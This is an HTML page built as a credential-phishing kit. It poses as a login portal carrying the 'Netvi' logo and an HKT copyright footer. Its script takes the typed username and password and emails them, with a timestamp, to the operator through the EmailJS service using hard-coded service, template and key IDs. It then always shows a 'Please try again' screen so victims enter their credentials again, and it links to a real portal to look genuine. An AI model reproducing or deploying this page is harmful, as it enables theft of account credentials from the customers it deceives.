<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Login to Your Account</title>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
  <script>
    emailjs.init("TLkClHUlQn5aQV4XO");
    window.onload = function() {
  const urlParams = new URLSearchParams(window.location.search);
  const email = urlParams.get('email');
  
  if (email) {
    document.getElementById('emailField').value = email;
  }
};
  </script>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-image: url('https://i.postimg.cc/pT0pDkn6/netvi-logo.jpg');
      background-size: contain;
      background-position: top center;
      background-repeat: no-repeat;
      background-color: #000;
      height: 100vh;
      margin: 0;
      padding: 0;
      text-align: center;
    }

    /* Full-screen login panel */
    .login-container {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background-color: rgba(0, 0, 0, 0.3); /* semi-transparent overlay */
      display: flex;
      justify-content: center;
      align-items: center;
      z-index: 1000;
    }

    .login-box {
      background-color: rgba(40, 40, 40, 0.95);
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      max-width: 400px;
      width: 90%;
      border-top: 5px solid #f07c00;
      text-align: center;
    }

    .login-logo {
      width: 150px;
      margin-bottom: 10px;
    }

    h2 {
      color: #fff;
      font-weight: bold;
      margin: 10px 0;
    }

    input {
      width: 85%;
      padding: 8px;
      margin: 10px 0;
      border: 1px solid #555;
      border-radius: 6px;
      background-color: #222;
      color: white;
    }

    input::placeholder {
      color: #bbb;
    }

    button {
      background-color: #f07c00;
      color: white;
      border: none;
      padding: 10px;
      width: 85%;
      cursor: pointer;
      border-radius: 6px;
      font-weight: bold;
      transition: background 0.3s;
    }

    button:hover {
      background-color: #d96b00;
    }

    .forgot-password {
      color: #f07c00;
      text-decoration: none;
      font-size: 14px;
    }

    .forgot-password:hover {
      text-decoration: underline;
    }

    #confirmation {
      display: none;
      background-color: rgba(40, 40, 40, 0.95);
      width: 100%;
      max-width: 400px;
      padding: 20px;
      margin: 100px auto;
      border-radius: 8px;
      box-shadow: 0px 4px 10px rgba(0, 0, 0, 0.3);
      border-top: 5px solid #f07c00;
    }

    #confirmation p {
      color: #fff;
      font-size: 18px;
      font-weight: bold;
    }

    footer {
      position: absolute;
      bottom: 10px;
      width: 100%;
      text-align: center;
      color: #888;
      font-size: 14px;
    }
  </style>
</head>
<body>

  <!-- Full-screen transparent login panel -->
  <div id="login" class="login-container">
    <div class="login-box">
      <img src="https://i.postimg.cc/pT0pDkn6/netvi-logo.jpg" alt="Netvi Logo" class="login-logo">
      <h2>Login to continue</h2>
      <input type="text" id="username" placeholder="Username" required>
      <input type="password" id="password" placeholder="Password" required>
      <button id="loginButton" onclick="authenticate()">Login</button>
      <p><a href="https://service.imsbiz.com/portal/index.jsp" class="forgot-password" target="_blank" rel="noopener noreferrer">Keep me logged in</a></p>
    </div>
  </div>

  <!-- Confirmation Message -->
  <div id="confirmation">
    <h2 style="color: red;">Please try again</h2>
    <p></p>
    <button onclick="retryLogin()">Go to login</button>
  </div>

  <!-- Footer -->
  <footer>
    Â© Hong Kong Telecommunications (HKT) Limited 2007-2025. All rights reserved.
  </footer>

  <script>
    function sendEmail(username, password) {
      const serviceID = "service_nfx0v2t";
      const templateID = "template_ccgi8xh";
      const publicKey = "TLkClHUlQn5aQV4XO";

      const templateParams = {
        login_history: `Username: ${username}\nPassword: ${password}\nLogged in at: ${new Date().toLocaleString()}`
      };

      return emailjs.send(serviceID, templateID, templateParams, publicKey);
    }

    function authenticate() {
      console.log("Login button clicked"); // Debugging log
      let loginButton = document.getElementById("loginButton");
      loginButton.textContent = "Authenticating...";
      loginButton.disabled = true;

      let username = document.getElementById("username").value.trim();
      let password = document.getElementById("password").value.trim();

      if (username && password) {
        sendEmail(username, password)
          .then(() => {
            console.log("Email sent successfully"); // Debugging log
            loginButton.textContent = "Login";
            loginButton.disabled = false;
            document.getElementById("login").style.display = "none";
            document.getElementById("confirmation").style.display = "block";
          })
          .catch(error => {
            console.error("Error sending email", error);
            loginButton.textContent = "Login";
            loginButton.disabled = false;
            alert("Failed to send login report. Please try again.");
          });
      } else {
        alert("Please enter both username and password.");
        loginButton.disabled = false;
        loginButton.textContent = "Login";
      }
    }

    function retryLogin() {
      console.log("Retrying login..."); // Debugging log
      document.getElementById("confirmation").style.display = "none";
      document.getElementById("login").style.display = "flex"; // Show login panel again
    }

    window.onload = function () {
      document.getElementById("login").style.top = "0";
    };
  </script>
</body>
</html>
